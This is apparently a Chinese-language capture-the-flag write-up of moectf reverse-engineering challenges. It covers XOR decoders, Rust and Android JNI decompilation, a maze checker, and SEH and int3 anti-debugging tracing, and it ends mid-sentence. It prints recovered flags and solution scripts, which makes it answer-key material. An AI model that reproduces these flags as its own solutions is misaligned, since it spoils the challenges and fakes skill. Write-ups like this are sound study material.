<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x9f</span>, <span class="number">0x91</span>, <span class="number">0xa7</span>, <span class="number">0xa5</span>, <span class="number">0x94</span>, <span class="number">0xa6</span>, <span class="number">0x8d</span>, <span class="number">0xb5</span>, <span class="number">0xa7</span>, <span class="number">0x9c</span>, <span class="number">0xa6</span>, <span class="number">0xa1</span>, <span class="number">0xbf</span>, <span class="number">0x91</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xa6</span>, <span class="number">0x53</span>, <span class="number">0xa5</span>, <span class="number">0xa3</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0x8f</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line">flag = [i ^ <span class="number">0x39</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">flag = [i - <span class="number">57</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>moectf{Self_Mod1f1cation}</p>
<h2 id="junk-code"><a href="#junk-code" class="headerlink" title="junk_code"></a>junk_code</h2><p>sub_45A9A0(Str, 18) &amp;&amp; sub_459EBF(v5, 18)中有call花指令影响ida分析，只需要patch 0x90(nop)掉ida就能正常分析了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Str1 = <span class="string">&#x27;hj`^oavt+pZm`h+q._&#x27;</span></span><br><span class="line">Str1 = [<span class="built_in">ord</span>(i) + <span class="number">5</span> <span class="keyword">for</span> i <span class="keyword">in</span> Str1]</span><br><span class="line"></span><br><span class="line">Str2 = [</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0x0E</span>, <span class="number">0x55</span>, <span class="number">0x39</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x39</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0x02</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">Str2 = [<span class="built_in">int</span>(i) ^ <span class="number">0x66</span> <span class="keyword">for</span> i <span class="keyword">in</span> Str2]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(Str1[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(Str2[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h2><p>cargo是rust的包管理器</p>
<p>cargo new project_aaaa 创建一个项目</p>
<p>cargo bulid 构建 cargo run 运行</p>
<p><a target="_blank" rel="noopener" href="https://rustwiki.org/zh-CN/book/">https://rustwiki.org/zh-CN/book/</a> rust基础语法</p>
<p>反编译后的代码量比较多，对于容器还有一些函数的操作，会有很多类型校验，值校验的操作，所以伪代码会比较多</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v28</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    </span><br><span class="line">    std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> v28).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = v28.<span class="title function_ invoke__">trim_end</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> input.<span class="title function_ invoke__">len</span>() != <span class="number">30</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Error: Input length must be 30 characters&quot;</span>);</span><br><span class="line">        std::process::<span class="title function_ invoke__">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">byte_array</span>: <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt; = <span class="built_in">vec!</span>[</span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xE7</span>, <span class="number">0xED</span>, <span class="number">0xEB</span>, <span class="number">0xFC</span>, <span class="number">0xEE</span>, <span class="number">0xF3</span>, <span class="number">0xDA</span>,</span><br><span class="line">        <span class="number">0xFD</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xD7</span>, <span class="number">0xFA</span>, <span class="number">0xED</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xE1</span>, <span class="number">0xE4</span>, <span class="number">0xE4</span>, <span class="number">0xD7</span>, <span class="number">0xEA</span>, <span class="number">0xED</span>, <span class="number">0xD7</span>,</span><br><span class="line">        <span class="number">0xE9</span>, <span class="number">0xFF</span>, <span class="number">0xEE</span>, <span class="number">0xFD</span>, <span class="number">0xB9</span>, <span class="number">0xF5</span></span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v34</span>: <span class="type">Vec</span>&lt;<span class="type">u8</span>&gt; = input.<span class="title function_ invoke__">chars</span>().<span class="title function_ invoke__">map</span>(|c| c <span class="keyword">as</span> <span class="type">u8</span>).<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">v38</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">for</span> (i, &amp;byte) <span class="keyword">in</span> byte_array.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> byte ^ <span class="number">0x88</span> != v34[i] &#123;</span><br><span class="line">            v38 = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> v38 &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大概是这样的一个逻辑</p>
<p>得到flag moectf{Rust_rev_will_be_awfu1}</p>
<h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (s.length() != <span class="number">23</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;长度不对哦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check(s) == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">Context</span> <span class="variable">applicationContext</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.getApplicationContext();</span><br><span class="line">                    Toast.makeText(applicationContext, <span class="string">&quot;OK!RIGHT,flag is moectf&#123;&quot;</span> + s + <span class="string">&quot;&#125;&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;Try to reverse the native lib!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">check</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;ezandroid&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据hint去查询资料了解到jni的代码存储在lib目录下的.so文件里面，然后在调用这些函数之前分动态注册和静态注册，静态注册的话搜索一个完整路径的类名就能找到代码位置，动态注册的话在注册的位置一路找到引用反编译就能找到位置</p>
<p>存在jni_onload就是动态注册</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qword_3BF8 = sub_173C(v6, <span class="string">&quot;com/doctor3/ezandroid/MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( qword_3BF8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (sub_1770(v6, qword_3BF8, off_2938, <span class="number">1LL</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">        v4 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 = <span class="number">65540</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个sub_1770应该是注册的函数，off_2938应该是要找的东西</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                        ; LOAD:<span class="number">0000000000000168</span>↑o ...</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002938</span> off_2938        DCQ aCheck              ; DATA XREF: JNI_OnLoad+<span class="number">148</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000002938</span>                                         ; <span class="string">&quot;check&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000002940</span>                 DCQ aLjavaLangStrin     ; <span class="string">&quot;(Ljava/lang/String;)I&quot;</span></span><br><span class="line">.data.rel.ro:<span class="number">0000000000002948</span>                 DCQ sub_17B4</span><br></pre></td></tr></table></figure>

<p>能看到传参的类型 sub17B4就是check的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_D7C</span><span class="params">(_BYTE *inputString)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// [xsp+14h] [xbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *flag; <span class="comment">// [xsp+18h] [xbp-18h]</span></span><br><span class="line">  _BOOL4 v6; <span class="comment">// [xsp+2Ch] [xbp-4h]</span></span><br><span class="line"></span><br><span class="line">  flag = &amp;asc_3B50[<span class="number">18</span>];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *inputString )</span><br><span class="line">      v3 = *flag != <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = inputString++;</span><br><span class="line">      <span class="keyword">switch</span> ( *v1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">          --flag;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">          ++flag;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">          flag += <span class="number">15</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">          flag -= <span class="number">15</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *flag == <span class="number">35</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ws应该是上下移的意思，可以知道迷宫的宽度为15</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">***************</span><br><span class="line">***@******#****</span><br><span class="line">***.******.****</span><br><span class="line">*...******.****</span><br><span class="line">*.********.****</span><br><span class="line">*.****.....****</span><br><span class="line">*.****.********</span><br><span class="line">*......********</span><br><span class="line">***************</span><br></pre></td></tr></table></figure>

<p>试了一下错了，重新看了一下，发现看的比较快 开头有个memcpy忽略了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(</span><br><span class="line">  v7,</span><br><span class="line">  <span class="string">&quot;******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......****&quot;</span></span><br><span class="line">  <span class="string">&quot;*******************&quot;</span>);</span><br><span class="line">v5 = __strlen_chk(v7, <span class="number">0x88</span>u);</span><br><span class="line">__memcpy_chk(asc_3B50, v7, v5, <span class="number">136LL</span>);</span><br></pre></td></tr></table></figure>

<p>asc_3B50就是看错的那个迷宫的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">***************</span><br><span class="line">***@***********</span><br><span class="line">***.***********</span><br><span class="line">*...****#..****</span><br><span class="line">*.********.****</span><br><span class="line">*.****.....****</span><br><span class="line">*.****.********</span><br><span class="line">*......********</span><br><span class="line">***********</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>moectf{ssaassssdddddwwddddwwaa}</p>
<h2 id="GUI-有问题"><a href="#GUI-有问题" class="headerlink" title="GUI [有问题]"></a>GUI [有问题]</h2><p>die显示是.net </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WndClass.lpfnWndProc = sub_450CDF;</span><br></pre></td></tr></table></figure>

<p>这里设置了窗口过程的函数指针，他会处理窗口相关的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT __stdcall <span class="title function_">sub_45BF90</span><span class="params">(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br></pre></td></tr></table></figure>

<p>hWbdParent是窗口的句柄，msg是消息的id，这个wparam和lparam好像是会根据消息的不同穿过来不同的附加消息。</p>
<p>关键是这里，这里是有个c++类，ida将这个类平坦开了，显示很奇怪，所以还是从汇编的视图去分析逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        DlgItem = GetDlgItem(hWndParent, <span class="number">2</span>);</span><br><span class="line">        GetWindowTextW(DlgItem, String, <span class="number">1024</span>);</span><br><span class="line">        sub_450C94(String);</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        sub_450A0A(v7, v8);</span><br><span class="line">        LOBYTE(v13) = <span class="number">1</span>;</span><br><span class="line">        sub_450C94(a91);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_4531AB(v7, v6) )</span><br><span class="line">          MessageBoxW(hWndParent, Text, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          MessageBoxW(hWndParent, <span class="string">L&quot;Sorry, flag error.&quot;</span>, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sub_4529B8(v6);</span><br><span class="line">        LOBYTE(v13) = <span class="number">0</span>;</span><br><span class="line">        sub_4529B8(v7);</span><br><span class="line">        v13 = <span class="number">-1</span>;</span><br><span class="line">        sub_4529B8(v8);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p>从inputString开始分析，这里ecx看起来很奇怪，查询资料才知道这个ecx是一个this指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    eax             ; hWnd</span><br><span class="line">call    ds:GetWindowTextW</span><br><span class="line">cmp     esi, esp</span><br><span class="line">call    j___RTC_CheckEsp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+String]</span><br><span class="line">push    eax</span><br><span class="line">lea     ecx, [ebp+var_498]</span><br><span class="line">call    sub_450C94</span><br><span class="line">mov     [ebp+var_4], <span class="number">0</span></span><br><span class="line">lea     eax, [ebp+var_498]</span><br><span class="line">push    eax</span><br><span class="line">lea     ecx, [ebp+var_4BC]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_450A0A</span><br><span class="line">add     esp, <span class="number">8</span></span><br></pre></td></tr></table></figure>







<h2 id="unwind"><a href="#unwind" class="headerlink" title="unwind"></a>unwind</h2><p>这个题一开始咱遇到挺多问题的，不过也学会 seh的程序怎么分析，哪些操作会出现异常被try块捕获 动态调试 一点点找反调试函数的方法。</p>
<p>一开始我就从静态上分析，先去学习了SEH大概是怎么样的一个东西，然后明白了SEH会对我分析程序运行顺序流程有影响，所以我需要关注什么汇编代码会出现异常，try块捕获后会跳转到哪里。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00415908</span> ;   __try &#123; <span class="comment">// __except at loc_415928</span></span><br><span class="line">.text:<span class="number">00415908</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041590F</span>                 mov     large dword ptr ds:<span class="number">0</span>, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041590F</span> ;   &#125; <span class="comment">// starts at 415908</span></span><br><span class="line">.text:<span class="number">00415919</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">00415920</span>                 jmp     <span class="type">short</span> loc_41597A</span><br></pre></td></tr></table></figure>

<p>这是第一个try块，这里往ds:0 写数据是会触发一个异常的，查询资料后知道, ds:0是操作系统捕获空指针解引用的地址，这个地址是受保护的，写数据会触发异常</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00411820</span> sub_411820      proc near               ; CODE XREF: sub_4110FF↑j</span><br><span class="line">.text:<span class="number">00411820</span></span><br><span class="line">.text:<span class="number">00411820</span> var_E4          = dword ptr <span class="number">-0E4</span>h</span><br><span class="line">.text:<span class="number">00411820</span> var_10          = byte ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">00411820</span> var_C           = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">00411820</span> var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">00411820</span></span><br><span class="line">.text:<span class="number">00411820</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00411821</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">00411823</span>                 sub     esp, <span class="number">0</span>D0h</span><br><span class="line">.text:<span class="number">00411829</span>                 push    ebx</span><br><span class="line">.text:<span class="number">0041182</span>A                 push    esi</span><br><span class="line">.text:<span class="number">0041182B</span>                 push    edi</span><br><span class="line">.text:<span class="number">0041182</span>C                 lea     edi, [ebp+var_10]</span><br><span class="line">.text:<span class="number">0041182F</span>                 mov     ecx, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00411834</span>                 mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">.text:<span class="number">00411839</span>                 rep stosd</span><br><span class="line">.text:<span class="number">0041183B</span>                 mov     eax, ___security_cookie</span><br><span class="line">.text:<span class="number">00411840</span>                 xor     eax, ebp</span><br><span class="line">.text:<span class="number">00411842</span>                 mov     [ebp+var_4], eax</span><br><span class="line">.text:<span class="number">00411845</span>                 mov     [ebp+var_C], offset loc_4112FD</span><br><span class="line">.text:<span class="number">0041184</span>C                 push    [ebp+var_C]</span><br><span class="line">.text:<span class="number">0041184F</span>                 push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">.text:<span class="number">00411856</span>                 mov     large fs:<span class="number">0</span>, esp</span><br><span class="line">.text:<span class="number">0041185</span>D                 <span class="type">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">0041185</span>E                 mov     eax, [esp+<span class="number">0E4</span>h+var_E4]</span><br><span class="line">.text:<span class="number">00411861</span>                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">.text:<span class="number">00411867</span>                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0041186</span>A                 pop     edi</span><br><span class="line">.text:<span class="number">0041186B</span>                 pop     esi</span><br><span class="line">.text:<span class="number">0041186</span>C                 pop     ebx</span><br><span class="line">.text:<span class="number">0041186</span>D                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">00411870</span>                 xor     ecx, ebp        ; StackCookie</span><br><span class="line">.text:<span class="number">00411872</span>                 call    j_@__security_check_cookie@<span class="number">4</span> ; __security_check_cookie(x)</span><br><span class="line">.text:<span class="number">00411877</span>                 add     esp, <span class="number">0</span>D0h</span><br><span class="line">.text:<span class="number">0041187</span>D                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">0041187F</span>                 call    j___RTC_CheckEsp</span><br><span class="line">.text:<span class="number">00411884</span>                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">00411886</span>                 pop     ebp</span><br><span class="line">.text:<span class="number">00411887</span>                 retn</span><br><span class="line">.text:<span class="number">00411887</span> sub_411820      endp</span><br></pre></td></tr></table></figure>

<p>第二个异常的位置就是在这里，int3是 x86里面的一个软中断指令，用来触发断点异常，调试器会用这个int3实现断点功能(这有个坑，关于动态调试的)</p>
<p>然后得出的逻辑是 inputString char[] 64这么一个数据 -&gt; 分成八个等长的子串 -&gt;前四个使用tea1和key[]数组加密-&gt;后四个使用tea2和key[]数组加密-&gt; cmp inputString flagString -&gt; jz flag success</p>
<p>大概是这么一个逻辑</p>
<p>遇到的第一个问题是，这个tea1和tea2其实是一个东西，call的时候咱没看清楚函数名字(反编译插件显示有些问题，就去跟着两个tea encode写了一遍代码qaq 。不过发现在分析算法的时候，一开始总点关注对输入输出是怎么样的一个处理流程，然后再给偏移地址全部打上标签，然后就能很快分析清楚了qaq)</p>
<p>然后写了decode之后怎么解都是只能解出前半段，看来看去逻辑都没有问题，调试的话就会莫名其妙的闪退</p>
<p>从main开始往下单步会发现</p>
